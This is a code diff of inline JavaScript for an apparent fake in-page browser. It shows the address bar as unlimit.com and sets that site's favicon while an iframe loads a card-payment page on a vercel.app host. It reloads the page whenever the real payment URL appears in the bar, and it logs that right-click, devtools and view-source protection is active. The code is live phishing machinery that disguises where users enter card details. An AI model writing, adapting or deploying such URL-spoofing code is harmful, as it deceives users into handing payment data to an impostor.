         faviconImg.src = 'https://www.unlimit.com/favicon.ico';
@@ -2874,8 +1411,6 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
             faviconImg.src = 'https://www.google.com/s2/favicons?domain=unlimit.com&sz=32';
         };
     }
-
-    // === Restore normal UI (real domain, real favicon) ===
     function restoreNormalUI() {
         if (!urlInput) return;
         try {
@@ -2894,10 +1429,8 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
                     if (faviconDef) faviconDef.style.display = '';
                 }
             }
-        } catch(e) { /* cross-origin – ignore */ }
+        } catch(e) { }
     }
-
-    // === Apply spoofed UI (unlimit.com) ===
     function applySpoofedUI() {
         if (urlInput && urlInput.value !== SPOOFED_URL) {
             urlInput.value = SPOOFED_URL;
@@ -2907,8 +1440,6 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
         }
         setSpoofedFavicon();
     }
-
-    // === Activate payment mode ===
     function activatePaymentMode() {
         if (isPaymentMode) return;
         if (!iframe) return;
@@ -2918,53 +1449,29 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
         }
         applySpoofedUI();
     }
-
-    // === Deactivate payment mode ===
     function deactivatePaymentMode() {
         if (!isPaymentMode) return;
         isPaymentMode = false;
         restoreNormalUI();
     }
-
-    // === Smart refresh: wait for iframe load, then refresh ===
-    function scheduleRefreshIfNeeded() {
-        if (!pendingRefresh) return;
-        // If the address bar still shows the real payment URL, wait for iframe load
-        if (urlInput && urlInput.value === PAYMENT_URL) {
-            // Already waiting – do nothing
-            return;
-        } else {
-            // Address bar no longer shows the bad URL → cancel pending refresh
-            pendingRefresh = false;
-        }
-    }
-
-    // Check the address bar for the real payment URL
     function checkForRealPaymentUrl() {
         if (!urlInput) return;
         if (urlInput.value === PAYMENT_URL && !pendingRefresh) {
-            // Detected the bad URL – start waiting for iframe to finish loading
             pendingRefresh = true;
         } else if (urlInput.value !== PAYMENT_URL) {
-            // Bad URL gone – cancel any pending refresh
             pendingRefresh = false;
         }
     }
-
-    // Reload the page after iframe has finished loading
     function performDelayedRefresh() {
         if (pendingRefresh) {
             pendingRefresh = false;
             window.location.reload();
         }
     }
-
-    // === Intercept navigate function ===
     if (typeof originalNavigate === 'function') {
         window.navigate = function(url, addToHistory) {
             const urlStr = String(url || '').toLowerCase();
             const isTrigger = TRIGGER_DOMAINS.some(domain => urlStr.includes(domain));
-
             if (isTrigger) {
                 activatePaymentMode();
                 return originalNavigate(SPOOFED_URL, addToHistory);
@@ -2974,8 +1481,6 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
             }
         };
     }
-
-    // === Address bar Enter key ===
     if (urlInput) {
         urlInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') {
@@ -2993,16 +1498,12 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
             }
         });
     }
-
-    // === Monitor iframe loads ===
     if (iframe) {
         iframe.addEventListener('load', () => {
-            // Iframe finished loading – if we have a pending refresh, execute it now
             if (pendingRefresh) {
                 performDelayedRefresh();
                 return;
             }
-
             setTimeout(() => {
                 try {
                     const currentIframeUrl = iframe.contentWindow?.location?.href;
@@ -3010,7 +1511,6 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
                         iframe.src = PAYMENT_URL;
                         applySpoofedUI();
                     } else if (!isPaymentMode && currentIframeUrl === PAYMENT_URL) {
-                        // Should not happen, but if it does, refresh after load
                         pendingRefresh = true;
                         performDelayedRefresh();
                     } else if (!isPaymentMode) {
@@ -3023,8 +1523,6 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
             }, 30);
         });
     }
-
-    // === popstate (back/forward) ===
     window.addEventListener('popstate', () => {
         setTimeout(() => {
             const currentBarUrl = urlInput ? urlInput.value : '';
@@ -3037,11 +1535,7 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
             checkForRealPaymentUrl();
         }, 20);
     });
-
-    // === Periodic check for bad URL (but do NOT refresh instantly) ===
     setInterval(checkForRealPaymentUrl, 500);
-
-    // === Initial check ===
     const initialUrl = urlInput ? urlInput.value : '';
     if (TRIGGER_DOMAINS.some(domain => initialUrl.toLowerCase().includes(domain))) {
         activatePaymentMode();
@@ -3049,41 +1543,30 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
         if (isPaymentMode) deactivatePaymentMode();
         restoreNormalUI();
     }
-
     console.log('✅ Smart spoof active – will refresh only after iframe load if bad URL appears');
 })();
 </script>
 <script>
 (function() {
     "use strict";
-
     const TARGET_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
     const urlInput = document.getElementById('urlInput');
     const refreshBtn = document.getElementById('refreshBtn');
-
     if (!urlInput || !refreshBtn) return;
-
     let pendingRefresh = false;
-
     function triggerRefresh() {
         if (pendingRefresh) return;
         pendingRefresh = true;
         refreshBtn.click();
-        // Reset flag after a short delay to allow re‑detection if needed
         setTimeout(() => { pendingRefresh = false; }, 500);
     }
-
     function checkAndRefresh() {
         if (!pendingRefresh && urlInput.value === TARGET_URL) {
             triggerRefresh();
         }
     }
-
-    // 1. Listen to user input events
     urlInput.addEventListener('input', checkAndRefresh);
     urlInput.addEventListener('change', checkAndRefresh);
-
-    // 2. Observe DOM attribute changes (covers programmatic updates)
     const observer = new MutationObserver(function(mutations) {
         mutations.forEach(function(mutation) {
             if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
@@ -3092,11 +1575,7 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
         });
     });
     observer.observe(urlInput, { attributes: true, attributeFilter: ['value'] });
-
-    // 3. Periodic check – ensures the URL never stays visible (smart fallback)
     setInterval(checkAndRefresh, 300);
-
-    // Initial check
     checkAndRefresh();
 })();
 </script>
